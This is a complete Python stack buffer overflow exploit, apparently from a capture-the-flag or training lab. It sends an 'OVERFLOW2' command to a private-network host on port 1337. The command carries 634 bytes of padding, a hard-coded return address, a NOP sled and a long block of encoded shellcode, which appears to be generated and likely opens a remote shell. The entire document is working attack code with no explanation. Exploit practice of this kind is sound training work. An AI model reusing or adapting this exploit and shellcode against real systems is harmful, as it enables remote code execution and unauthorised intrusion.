import socket

ip = "10.10.156.167"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x89\xe1\xda\xcf\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
"\x42\x75\x4a\x49\x39\x6c\x48\x68\x6e\x62\x53\x30\x47\x70"
"\x37\x70\x73\x50\x4d\x59\x7a\x45\x46\x51\x69\x50\x30\x64"
"\x6e\x6b\x32\x70\x70\x30\x6e\x6b\x46\x32\x56\x6c\x6e\x6b"
"\x72\x72\x74\x54\x4c\x4b\x31\x62\x47\x58\x44\x4f\x58\x37"
"\x43\x7a\x34\x66\x36\x51\x59\x6f\x4e\x4c\x77\x4c\x61\x71"
"\x61\x6c\x66\x62\x36\x4c\x67\x50\x6f\x31\x78\x4f\x54\x4d"
"\x45\x51\x4b\x77\x49\x72\x4c\x32\x66\x32\x71\x47\x4e\x6b"
"\x46\x32\x76\x70\x6e\x6b\x62\x6a\x77\x4c\x6c\x4b\x70\x4c"
"\x46\x71\x74\x38\x4b\x53\x72\x68\x56\x61\x38\x51\x42\x71"
"\x4c\x4b\x33\x69\x35\x70\x47\x71\x49\x43\x6c\x4b\x72\x69"
"\x36\x78\x6b\x53\x76\x5a\x70\x49\x4c\x4b\x37\x44\x6e\x6b"
"\x73\x31\x58\x56\x50\x31\x59\x6f\x4c\x6c\x4b\x71\x68\x4f"
"\x56\x6d\x56\x61\x4a\x67\x76\x58\x39\x70\x54\x35\x68\x76"
"\x76\x63\x43\x4d\x68\x78\x77\x4b\x53\x4d\x54\x64\x63\x45"
"\x6a\x44\x61\x48\x4c\x4b\x61\x48\x57\x54\x53\x31\x48\x53"
"\x30\x66\x4e\x6b\x46\x6c\x52\x6b\x6e\x6b\x33\x68\x77\x6c"
"\x55\x51\x6b\x63\x6e\x6b\x35\x54\x4c\x4b\x67\x71\x6e\x30"
"\x6f\x79\x67\x34\x64\x64\x61\x34\x43\x6b\x73\x6b\x71\x71"
"\x32\x79\x31\x4a\x66\x31\x39\x6f\x79\x70\x63\x6f\x53\x6f"
"\x51\x4a\x6c\x4b\x34\x52\x58\x6b\x4e\x6d\x73\x6d\x30\x68"
"\x64\x73\x35\x62\x63\x30\x73\x30\x30\x68\x51\x67\x53\x43"
"\x65\x62\x33\x6f\x73\x64\x70\x68\x32\x6c\x61\x67\x37\x56"
"\x44\x47\x49\x6f\x7a\x75\x4f\x48\x5a\x30\x43\x31\x57\x70"
"\x67\x70\x45\x79\x49\x54\x36\x34\x56\x30\x30\x68\x35\x79"
"\x6f\x70\x50\x6b\x73\x30\x79\x6f\x6b\x65\x36\x30\x50\x50"
"\x66\x30\x56\x30\x71\x50\x36\x30\x37\x30\x72\x70\x50\x68"
"\x38\x6a\x36\x6f\x39\x4f\x4b\x50\x69\x6f\x49\x45\x6d\x47"
"\x52\x4a\x73\x35\x61\x78\x56\x6a\x56\x6b\x54\x43\x55\x46"
"\x70\x68\x63\x32\x45\x50\x67\x61\x31\x4c\x4b\x39\x6b\x56"
"\x32\x4a\x52\x30\x56\x36\x33\x67\x32\x48\x5a\x39\x6f\x55"
"\x31\x64\x73\x51\x4b\x4f\x38\x55\x4e\x65\x69\x50\x33\x44"
"\x66\x6c\x6b\x4f\x50\x4e\x54\x48\x62\x55\x7a\x4c\x45\x38"
"\x6c\x30\x6e\x55\x49\x32\x32\x76\x6b\x4f\x6b\x65\x75\x38"
"\x71\x73\x52\x4d\x52\x44\x37\x70\x4c\x49\x58\x63\x46\x37"
"\x30\x57\x73\x67\x44\x71\x39\x66\x43\x5a\x72\x32\x72\x79"
"\x73\x66\x68\x62\x6b\x4d\x55\x36\x38\x47\x72\x64\x47\x54"
"\x65\x6c\x37\x71\x65\x51\x6e\x6d\x42\x64\x67\x54\x64\x50"
"\x6b\x76\x73\x30\x31\x54\x52\x74\x70\x50\x72\x76\x31\x46"
"\x66\x36\x30\x46\x62\x76\x42\x6e\x30\x56\x42\x76\x46\x33"
"\x51\x46\x30\x68\x32\x59\x78\x4c\x47\x4f\x4f\x76\x79\x6f"
"\x6b\x65\x4d\x59\x6d\x30\x50\x4e\x71\x46\x33\x76\x79\x6f"
"\x66\x50\x52\x48\x53\x38\x6f\x77\x55\x4d\x71\x70\x39\x6f"
"\x4e\x35\x4d\x6b\x79\x70\x37\x6d\x46\x4a\x67\x7a\x53\x58"
"\x6c\x66\x4f\x65\x4d\x6d\x6f\x6d\x4b\x4f\x6b\x65\x37\x4c"
"\x56\x66\x61\x6c\x34\x4a\x6f\x70\x6b\x4b\x4d\x30\x73\x45"
"\x33\x35\x6f\x4b\x33\x77\x35\x43\x51\x62\x52\x4f\x71\x7a"
"\x55\x50\x33\x63\x6b\x4f\x68\x55\x41\x41")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
